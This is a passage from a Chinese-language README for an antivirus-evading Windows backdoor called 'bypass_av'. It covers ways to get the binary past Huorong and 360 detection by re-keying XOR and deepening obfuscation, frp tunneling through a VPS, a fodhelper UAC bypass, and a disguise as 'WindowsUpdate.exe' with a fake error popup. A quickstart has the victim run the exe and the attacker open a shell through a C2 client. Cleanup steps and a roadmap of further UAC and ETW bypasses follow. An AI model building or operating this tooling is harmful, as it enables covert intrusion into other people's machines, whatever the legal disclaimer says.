或下载 frp from [https://github.com/fatedier/frp/releases](https://github.com/fatedier/frp/releases) + UPX 压缩：
```cmd
curl -L https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_windows_amd64.zip -o frp.zip
tar xf frp.zip
upx --best frpc.exe -o frpc_upx.exe
```

### 9.4 火绒/360 杀掉了 bypass.exe

可能的缓解：
1. 改 XOR key（main.c `XOR_KEY_TRANSPORT[]` 重新选 8 字节 + 重 build）
2. 重新编译（hash 变化，因为 _padding 是 PRNG 填充）
3. 调整 payload 投递方式（避免静态扫描）
4. 升级 main.c 的混淆深度

### 9.5 C2 客户端中文输出乱码

`c2client.py` 已经 fallback utf-8 → gbk → cp936。仍有乱码：
- 调整攻击者侧 locale：`export LANG=zh_CN.UTF-8` 或在 Windows cmd 用 `chcp 65001`

---

## 十、恢复与回滚

> 这里的"恢复"含义：**回滚到 v4 polish 之前** 的版本（baseline `2026-07-17` 之前的原始状态），或**回滚到你自己的旧版本**。

### 10.1 一键回滚（推荐）

`bypass_av/_polish.bak/2026-07-17/revert.bat` 在每次打磨后自动生成。

```cmd
cd bypass_av\_polish.bak\2026-07-17
revert.bat
```

或调用 PowerShell：
```powershell
powershell -ExecutionPolicy Bypass -File `
    bypass_av\_polish.bak\2026-07-17\revert.ps1 `
    bypass_av\_polish.bak\2026-07-17 `
    <project_root>          :: ← 替换为你的项目根目录
```

回滚后**保留**：
- ✅ 所有 12 个被删的孤立产物回到原位（bypass_upnp.exe / dbg_bypass.exe / *.bak 等）
- ✅ `README.md` 回到 172 行 FRP-only 旧版
- ✅ `build_bypass.bat` / `rebuild_*.bat` 回到独立 80~100 行自包含版本
- ✅ `main.c` / `c2client.py` / 工具脚本回到 polish 前版本

回滚后**仍新增**（不自动删除）：
- `build.bat` —— 统一 dispatcher
- `.gitignore` —— 项目级
- `_polish.bak/` 目录
- `POLISH_REPORT.md` / `CODE_AUDIT.md`

如果你想**完全删除**本次打磨的痕迹（不要 `_polish.bak/` 本身）：
```cmd
rmdir /s /q bypass_av\_polish.bak
del bypass_av\POLISH_REPORT.md bypass_av\CODE_AUDIT.md
del .gitignore
del bypass_av\build.bat
```

### 10.2 手动回滚特定文件

`_polish.bak/2026-07-17/baseline_hashes.txt` 列出 62 个文件的 SHA256 baseline。挑你想回滚的：

```cmd
:: 例子：把 main.c 还原到之前版本
copy /Y bypass_av\_polish.bak\2026-07-17\bypass_av\main.c bypass_av\main.c
```

### 10.3 派生你自己的新版本前

如果有人接手这个项目并迭代：

1. **先备份** —— 把新版本 commit 之前跑：
   ```powershell
   powershell -ExecutionPolicy Bypass -File _polish.bak/2026-07-17/_backup.ps1 `
       . <project_root>\_polish.bak\<your-date>
   ```
   会生成完整 SHA256 baseline + 副本。

2. **测试** —— `tests\run_tests.bat`

3. **构建** —— 至少跑 `build.bat plain` 和 mode you change

4. **回滚脚本会同步更新** —— 每次 backup 都生成 revert.bat

### 10.4 编译产物清理（如果你想重头来过）

```cmd
del /Q bypass_av\bypass.exe bypass_av\WindowsUpdate.exe
del /Q bypass_av\*.obj bypass_av\byp.res
del /Q bypass_av\config_data.h bypass_av\frpc_data.h
del /Q bypass_av\tunnel_cfg.h bypass_av\upnp_data.h
del /Q bypass_av\reverse_cfg.h
```

`_polish.bak/` 不删 —— 它是最后备份网。

### 10.5 受害目标机清理

和 §8.1 一样：
```cmd
:: 管理员身份
taskkill /f /im runtime.exe
taskkill /f /im bypass.exe
recover.bat
```

或手动：见 §8.1 方式 B。

### 10.6 VPS / 中继机的清理

```bash
ssh root@<VPS_IP>

# 停服
systemctl stop frps
systemctl disable frps

# 删
rm /etc/systemd/system/frps.service
rm /opt/frp/ -rf

# 删 ufw 规则
ufw delete allow 7000/tcp
ufw delete allow 4444/tcp
```

---

## 十一、变更日志

完整 change log 见 [`POLISH_REPORT.md`](./POLISH_REPORT.md) 和 [`CODE_AUDIT.md`](./CODE_AUDIT.md)。

**当前 v4 状态**（stable）：

- ✅ 6 个 🐞 真 bug 全修（取证残留 / NULL deref / 错误路径清理 / bare except / GBK fallback / build dispatcher 参数 bug）
- ✅ 5 个 🟡 优化全落实（jk 围栏 / strapp 边界 / XOR 合并 / bsh 拆 + 并发 / 随机 padding）
- ✅ 6 个 🔵 新功能全交付（per-session 协商 / reverse mode / concurrent bind / fodhelper UAC / 单元测试 + CI / FRPS systemd）
- ✅ 22 算法级单元测试通过
- ✅ CI 在 Windows-latest 上 build + test

下一个迭代方向（如要）：
- 多客户端并发 bind 的 client identity 区分（现在所有 client 共享 cmd.exe 实例）
- UAC bypass 旁路矩阵（fodhelper 之外的 eventvwr / computerdefaults / sdclt fallback chain）
- Win 11 23H2/24H2 上 `EtwEventWrite` 现已不存在 —— 改用 `EtwEventWriteTransfer` 修补
- 进程化 payload（live-migrate 内存）
- 单元测试扩到 src/test_hashes.c（验证 hash 表能在 Windows 真机 resolve）

---

## 十二、法律声明

本项目**仅用于**：

- ✅ 授权渗透测试 / 红队演练
- ✅ 安全研究 / 学院环境
- ✅ 个人测试（自己的主机）

**严禁用于**：

- ❌ 任何未授权系统
- ❌ 钓鱼 / 勒索 / 偷数据
- ❌ 商业间谍 / 国家行为

> 中国《中华人民共和国网络安全法》《刑法》第285、286条及相关法律法规对未经授权的入侵有严厉刑事处罚。  
> 美国 Computer Fraud and Abuse Act (CFAA) 18 U.S.C. § 1030 及各州法律类似。  
> EU Directive 2013/40/EU on attacks against information systems。  
> 作者 / 维护者不对任何滥用行为负责。

---

## 附录：5 分钟最短路径

只想把项目跑起来看效果？

```cmd
:: === 编译机 ===
cd <project_root>\bypass_av
build.bat                             :: plain bind shell 模式

:: === 目标机 ===
:: 把 bypass_av\bypass.exe 拷过去，双击，UAC 选"是"
:: 等 12 秒看弹窗（"WindowsUpdate Error: ..." 那个），代表 bind 已 ready

:: === 攻击者 (同网段) ===
python3 tools\c2client.py <target_ip> 54321
c2[<target_ip>]> help
c2[<target_ip>]> sysinfo
c2[<target_ip>]> shell
PS> whoami
```

30 秒见效。

---

**项目根 [README.md](../../README.md)** · **架构 [HANDOVER.md →](./HANDOVER.md)** · **教程 [操作教程.md →](./操作教程.md)**
